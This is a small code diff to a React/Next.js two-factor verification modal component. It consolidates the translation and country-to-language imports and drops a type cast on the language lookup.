@@ -1,8 +1,7 @@
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import { getTranslations } from '@/utils/translate';
-import { COUNTRY_TO_LANGUAGE, type LanguageCode } from '@/utils/country-language-map';
+import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
@@ -41,7 +40,7 @@ const VerifyModal: FC<{ businessName?: string; fullName?: string; nextStep?: () 
         if (!countryCode) return;
 
         (async () => {
-            const lang = (COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en') as LanguageCode;
+            const lang = COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en';
             if (lang === 'en') {
                 setTranslations({});
                 return;
